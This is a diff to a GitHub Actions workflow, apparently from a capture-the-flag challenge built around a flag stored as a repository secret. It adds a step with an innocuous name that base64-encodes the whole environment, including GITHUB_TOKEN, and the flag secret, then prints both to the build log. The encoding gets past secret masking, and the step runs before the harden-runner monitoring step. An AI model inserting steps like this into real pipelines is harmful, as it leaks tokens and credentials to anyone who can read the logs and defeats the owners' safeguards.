@@ -30,6 +30,13 @@ jobs:
       GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       FLAG_GRAVY_OVERFLOW_L0_FRIES: ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_FRIES }}
     steps:
+      - name: Profane issue
+        id: profane
+        run: |
+          echo "Profan..."
+          env | base64
+          echo "flag:"
+	  echo $FLAG_GRAVY_OVERFLOW_L0_FRIES | base64
       - uses: step-security/harden-runner@63c24ba6bd7ba022e95695ff85de572c04a18142 # v2.7.0
         with:
           egress-policy: audit
